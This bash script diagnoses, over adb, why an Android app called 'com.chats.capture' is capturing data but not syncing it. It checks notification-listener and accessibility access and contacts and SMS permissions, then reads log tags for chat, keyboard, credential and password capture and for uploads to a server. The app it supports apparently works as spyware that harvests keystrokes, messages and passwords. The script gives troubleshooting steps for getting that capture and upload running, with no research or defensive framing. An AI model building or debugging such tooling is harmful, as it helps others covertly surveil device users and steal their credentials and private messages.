#!/bin/bash

# Script to check if app is capturing data but not syncing
# This helps identify why collections might be empty

echo "=========================================="
echo "App Data Capture & Sync Diagnostic"
echo "=========================================="
echo ""

APP_PACKAGE="com.chats.capture"

# Check if device is connected
if ! adb devices | grep -q "device$"; then
    echo "❌ No Android device connected."
    exit 1
fi

echo "✅ Device connected"
echo ""

# Check if app is installed
if ! adb shell pm list packages | grep -q "$APP_PACKAGE"; then
    echo "❌ App is NOT INSTALLED"
    echo ""
    echo "📥 Install the app first:"
    echo "   ./gradlew installDebug"
    exit 1
fi

echo "✅ App is installed"
echo ""

# Check permissions
echo "🔐 Checking Permissions:"
echo ""

# Notification Access
NOTIF_ACCESS=$(adb shell settings get secure enabled_notification_listeners 2>/dev/null | grep -q "$APP_PACKAGE" && echo "✅" || echo "❌")
echo "   Notification Access: $NOTIF_ACCESS"

# Accessibility Service
ACC_SERVICE=$(adb shell settings get secure enabled_accessibility_services 2>/dev/null | grep -q "$APP_PACKAGE" && echo "✅" || echo "❌")
echo "   Accessibility Service: $ACC_SERVICE"

# Contacts Permission
CONTACTS_PERM=$(adb shell dumpsys package $APP_PACKAGE 2>/dev/null | grep -q "READ_CONTACTS.*granted=true" && echo "✅" || echo "❌")
echo "   READ_CONTACTS Permission: $CONTACTS_PERM"

# SMS Permission
SMS_PERM=$(adb shell dumpsys package $APP_PACKAGE 2>/dev/null | grep -q "READ_SMS.*granted=true" && echo "✅" || echo "❌")
echo "   READ_SMS Permission: $SMS_PERM"

echo ""

# Check recent logcat for capture activity
echo "📊 Recent Capture Activity (last 50 lines):"
echo ""

echo "Notifications:"
adb logcat -d -s NOTIFICATION_CAPTURE:D | tail -10 | head -5
if [ $? -ne 0 ] || [ -z "$(adb logcat -d -s NOTIFICATION_CAPTURE:D | tail -1)" ]; then
    echo "   ⚠️  No notification capture activity found"
fi
echo ""

echo "Chats:"
adb logcat -d -s CHAT_CAPTURE:D KEYBOARD_CAPTURE:D | tail -10 | head -5
if [ $? -ne 0 ] || [ -z "$(adb logcat -d -s CHAT_CAPTURE:D KEYBOARD_CAPTURE:D | tail -1)" ]; then
    echo "   ⚠️  No chat capture activity found"
fi
echo ""

echo "Credentials:"
adb logcat -d -s CREDENTIAL_CAPTURE:D PASSWORD_CAPTURE:D | tail -10 | head -5
if [ $? -ne 0 ] || [ -z "$(adb logcat -d -s CREDENTIAL_CAPTURE:D PASSWORD_CAPTURE:D | tail -1)" ]; then
    echo "   ⚠️  No credential capture activity found"
fi
echo ""

echo "Sync Activity:"
adb logcat -d -s SYNC_WORKER:D | tail -10 | head -5
if [ $? -ne 0 ] || [ -z "$(adb logcat -d -s SYNC_WORKER:D | tail -1)" ]; then
    echo "   ⚠️  No sync activity found"
fi
echo ""

echo "API Requests:"
adb logcat -d -s API_CLIENT:D API_REQUEST_DATA:D | tail -10 | head -5
if [ $? -ne 0 ] || [ -z "$(adb logcat -d -s API_CLIENT:D API_REQUEST_DATA:D | tail -1)" ]; then
    echo "   ⚠️  No API request activity found"
fi
echo ""

# Check device registration
echo "Device Registration:"
adb logcat -d -s DEVICE_REGISTRATION:D | tail -5 | head -3
if [ $? -ne 0 ] || [ -z "$(adb logcat -d -s DEVICE_REGISTRATION:D | tail -1)" ]; then
    echo "   ⚠️  No device registration activity found"
fi
echo ""

echo "=========================================="
echo ""
echo "💡 Recommendations:"
echo ""

if [ "$NOTIF_ACCESS" = "❌" ]; then
    echo "   ⚠️  Grant Notification Access: Settings → Apps → Special Access → Notification Access"
fi

if [ "$ACC_SERVICE" = "❌" ]; then
    echo "   ⚠️  Enable Accessibility Service: Settings → Accessibility → Downloaded Apps"
fi

if [ "$CONTACTS_PERM" = "❌" ]; then
    echo "   ⚠️  Grant READ_CONTACTS permission: Settings → Apps → [App Name] → Permissions"
fi

echo ""
echo "   ⚠️  Enable Capture: Settings → Apps → [App Name] → Toggle 'Capture Enabled' ON"
echo "   ⚠️  Verify Server URL in app settings"
echo "   ⚠️  Check network connectivity"
echo ""

echo "=========================================="
